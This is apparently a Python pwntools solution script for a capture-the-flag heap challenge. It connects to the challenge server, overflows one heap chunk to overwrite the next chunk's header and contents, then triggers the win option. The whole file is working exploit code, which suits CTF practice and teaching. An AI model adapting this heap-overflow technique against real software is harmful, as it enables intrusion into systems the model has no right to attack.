#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'source/chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'mitigations-are-awesome.ctf.umasscybersec.org'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401a2f
b *0x00401c3e
b *0x00401c23
b *0x00401c17
b *0x004019c5
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

prompt = b" > What action do you want to take?\n"
def alloc(size):
    io.recvuntil(prompt)
    io.sendline(b"1")
    io.sendline(str(size).encode())

def win():
    io.recvuntil(prompt)
    io.sendline(b"4")

def edit(idx, payload):
    io.recvuntil(prompt)
    io.sendline(b"3")
    # What index do you wish to edit?
    io.recvline()
    io.sendline(str(idx).encode())
    
    # How many bytes do you want to write to the buffer?
    io.recvline()
    io.sendline(str(len(payload)).encode())
    
    # What data do you want to write? Now be good and don't go out of bounds!
    io.recvline()
    io.sendline(payload)

io = start()

alloc(20)
alloc(20) 

p = b"A" *24
p += p64(0x21)
p += p64(0x0)*3
p += p64(0x20831)
p += b"Ez W"

edit(0, p)
win()
io.interactive()

